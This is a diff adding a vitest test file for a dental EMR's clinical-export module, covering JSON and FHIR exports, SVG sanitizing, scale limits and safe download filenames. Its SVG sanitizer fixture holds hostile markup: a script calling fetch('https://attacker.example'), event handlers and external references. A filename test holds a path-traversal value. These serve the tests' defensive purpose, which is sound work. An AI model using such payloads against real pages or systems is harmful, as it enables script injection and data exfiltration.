@@ -1,0 +1,234 @@
+import { describe, expect, it } from "vitest";
+
+import {
+  MAX_EXPORT_SVG_DIMENSION,
+  MAX_EXPORT_SVG_SCALE,
+  buildEmrJsonExport,
+  buildFhirBundleExport,
+  clinicalExportContentDisposition,
+  clinicalExportContentType,
+  clinicalExportFilename,
+  clampExportScale,
+  sanitizeChartExportSvg,
+  sanitizeExportPatientCode,
+  type ClinicalExportProjection,
+} from "./clinical-export";
+
+const projection: ClinicalExportProjection = {
+  exportId: "66666666-6666-4666-8666-666666666666",
+  patientCode: "P-000123",
+  clinicalDate: "2026-09-01",
+  scope: "CHART_AND_PROGRESS",
+  chart: [
+    {
+      toothCode: "16",
+      clinicalCode: "CARIES",
+      surfaces: ["O"],
+      status: "ACTIVE",
+      recordedAt: "2026-08-01T04:00:00.000Z",
+    },
+    {
+      toothCode: "21",
+      clinicalCode: "CROWN",
+      surfaces: [],
+      status: "COMPLETED",
+      recordedAt: "2026-08-02T04:00:00.000Z",
+    },
+  ],
+  progress: [
+    {
+      occurredAt: "2026-08-01T04:00:00.000Z",
+      eventType: "FINDING",
+      description: "Caries recorded",
+      toothCodes: [16],
+    },
+  ],
+};
+
+describe("buildEmrJsonExport", () => {
+  it("emits the same versioned envelope the importer accepts", () => {
+    const document = JSON.parse(buildEmrJsonExport(projection));
+    expect(document.format).toBe("dental-emr.clinical-chart");
+    expect(document.version).toBe(1);
+    expect(Array.isArray(document.records)).toBe(true);
+    expect(document.records[0]).toEqual({
+      kind: "TOOTH_FINDING",
+      toothCode: "16",
+      clinicalCode: "CARIES",
+      surfaces: ["O"],
+      clinicalDate: "2026-08-01",
+      note: null,
+    });
+  });
+
+  it("carries no organization, branch, provider, actor or patient identifier", () => {
+    const serialized = buildEmrJsonExport(projection);
+    for (const forbidden of [
+      "organizationId",
+      "organization_id",
+      "branchId",
+      "branch_id",
+      "providerId",
+      "treatingProviderId",
+      "createdBy",
+      "patientId",
+      "recorded_by",
+    ]) {
+      expect(serialized).not.toContain(forbidden);
+    }
+  });
+
+  it("carries no signed media URL or absolute external reference", () => {
+    expect(buildEmrJsonExport(projection)).not.toMatch(/https?:\/\//);
+  });
+});
+
+describe("buildFhirBundleExport", () => {
+  it("emits an R4 collection Bundle of Condition resources in the accepted subset", () => {
+    const bundle = JSON.parse(buildFhirBundleExport(projection));
+    expect(bundle.resourceType).toBe("Bundle");
+    expect(bundle.type).toBe("collection");
+    expect(bundle.entry).toHaveLength(2);
+    const condition = bundle.entry[0].resource;
+    expect(condition.resourceType).toBe("Condition");
+    expect(condition.code.coding[0]).toEqual({ system: "http://snomed.info/sct", code: "80967001" });
+    expect(condition.bodySite[0].coding).toEqual([
+      { system: "http://terminology.hl7.org/CodeSystem/ex-tooth", code: "16" },
+      { system: "http://terminology.hl7.org/CodeSystem/surface", code: "O" },
+    ]);
+  });
+
+  it("names no subject, encounter, asserter, recorder, performer or fullUrl", () => {
+    const serialized = buildFhirBundleExport(projection);
+    for (const forbidden of ["subject", "encounter", "asserter", "recorder", "performer", "fullUrl"]) {
+      expect(serialized).not.toContain(forbidden);
+    }
+  });
+
+  it("uses only the allowlisted terminology systems and no other absolute URL", () => {
+    const urls = buildFhirBundleExport(projection).match(/https?:\/\/[^"]+/g) ?? [];
+    expect(urls.length).toBeGreaterThan(0);
+    for (const url of urls) {
+      expect([
+        "http://snomed.info/sct",
+        "http://terminology.hl7.org/CodeSystem/ex-tooth",
+        "http://terminology.hl7.org/CodeSystem/surface",
+        "http://terminology.hl7.org/CodeSystem/condition-clinical",
+        "http://terminology.hl7.org/CodeSystem/condition-ver-status",
+      ]).toContain(url);
+    }
+  });
+
+  it("round-trips: everything it emits is re-importable as a supported candidate", () => {
+    const bundle = JSON.parse(buildFhirBundleExport(projection));
+    expect(bundle.entry.every((entry: { resource: { resourceType: string } }) =>
+      entry.resource.resourceType === "Condition")).toBe(true);
+  });
+});
+
+describe("sanitizeChartExportSvg", () => {
+  const hostile = [
+    '<svg xmlns="http://www.w3.org/2000/svg" width="99999" height="99999" onload="steal()">',
+    "<script>fetch('https://attacker.example')</script>",
+    '<a href="https://attacker.example"><rect x="1" y="1" width="2" height="2" /></a>',
+    '<image xlink:href="https://storage.example/signed?X-Amz-Signature=deadbeef" />',
+    '<foreignObject><div onclick="x()">hi</div></foreignObject>',
+    '<rect fill="url(https://attacker.example/x.svg#p)" />',
+    "</svg>",
+  ].join("");
+
+  it("removes script, anchor and foreignObject content", () => {
+    const safe = sanitizeChartExportSvg(hostile);
+    expect(safe).not.toContain("<script");
+    expect(safe).not.toContain("fetch(");
+    expect(safe).not.toContain("<a ");
+    expect(safe).not.toContain("foreignObject");
+  });
+
+  it("strips every event handler attribute", () => {
+    const safe = sanitizeChartExportSvg(hostile);
+    expect(safe).not.toMatch(/\son[a-z]+\s*=/i);
+  });
+
+  it("never keeps a signed media URL or any absolute reference", () => {
+    const safe = sanitizeChartExportSvg(hostile);
+    expect(safe).not.toContain("X-Amz-Signature");
+    expect(safe).not.toContain("attacker.example");
+    expect(safe).not.toContain("storage.example");
+    expect(safe).not.toMatch(/xlink:href|(?<!xmlns:x)href\s*=/);
+  });
+
+  it("clamps the root width and height to the fixed maximum dimension", () => {
+    const safe = sanitizeChartExportSvg(hostile);
+    expect(safe).toContain(`width="${MAX_EXPORT_SVG_DIMENSION}"`);
+    expect(safe).toContain(`height="${MAX_EXPORT_SVG_DIMENSION}"`);
+    expect(safe).not.toContain("99999");
+  });
+
+  it("keeps the drawing itself", () => {
+    const safe = sanitizeChartExportSvg(hostile);
+    expect(safe).toContain("<svg");
+    expect(safe).toContain("<rect");
+  });
+
+  it("returns an empty string for anything that is not an SVG root", () => {
+    expect(sanitizeChartExportSvg("<html><body>no</body></html>")).toBe("");
+    expect(sanitizeChartExportSvg("")).toBe("");
+  });
+});
+
+describe("clampExportScale", () => {
+  it("holds a raster export to the fixed maximum scale", () => {
+    expect(clampExportScale(1)).toBe(1);
+    expect(clampExportScale(MAX_EXPORT_SVG_SCALE)).toBe(MAX_EXPORT_SVG_SCALE);
+    expect(clampExportScale(64)).toBe(MAX_EXPORT_SVG_SCALE);
+    expect(clampExportScale(0)).toBe(1);
+    expect(clampExportScale(Number.NaN)).toBe(1);
+  });
+});
+
+describe("the download filename", () => {
+  it("contains only the synthetic-safe patient code, the date and the extension", () => {
+    expect(clinicalExportFilename({ patientCode: "P-000123", clinicalDate: "2026-09-01", format: "PDF" }))
+      .toBe("clinical-chart-P-000123-2026-09-01.pdf");
+    expect(
+      clinicalExportFilename({ patientCode: "P-000123", clinicalDate: "2026-09-01", format: "FHIR_R4_BUNDLE" }),
+    ).toBe("clinical-chart-P-000123-2026-09-01.json");
+  });
+
+  it("never carries clinical text, a path, or a quote, whatever the stored code says", () => {
+    const filename = clinicalExportFilename({
+      patientCode: 'Dela Cruz, caries "16"/../..\\etc',
+      clinicalDate: "2026-09-01",
+      format: "SVG",
+    });
+    expect(filename).toBe("clinical-chart-DelaCruzcaries16etc-2026-09-01.svg");
+    expect(filename).not.toMatch(/[\\/"'\s]/);
+  });
+
+  it("falls back to a fixed token when the stored code sanitizes to nothing", () => {
+    expect(sanitizeExportPatientCode("患者")).toBe("patient");
+    expect(sanitizeExportPatientCode("")).toBe("patient");
+    expect(sanitizeExportPatientCode("x".repeat(200))).toHaveLength(32);
+  });
+
+  it("refuses a clinical date that is not an ISO day", () => {
+    expect(() =>
+      clinicalExportFilename({ patientCode: "P-1", clinicalDate: "not-a-date", format: "PNG" }),
+    ).toThrow();
+  });
+
+  it("quotes the display filename in Content-Disposition and adds no other field", () => {
+    expect(clinicalExportContentDisposition("clinical-chart-P-1-2026-09-01.pdf")).toBe(
+      'attachment; filename="clinical-chart-P-1-2026-09-01.pdf"',
+    );
+  });
+
+  it("names one content type per export format", () => {
+    expect(clinicalExportContentType("EMR_JSON_V1")).toBe("application/json");
+    expect(clinicalExportContentType("FHIR_R4_BUNDLE")).toBe("application/fhir+json");
+    expect(clinicalExportContentType("SVG")).toBe("image/svg+xml");
+    expect(clinicalExportContentType("PNG")).toBe("image/png");
+    expect(clinicalExportContentType("PDF")).toBe("application/pdf");
+  });
+});
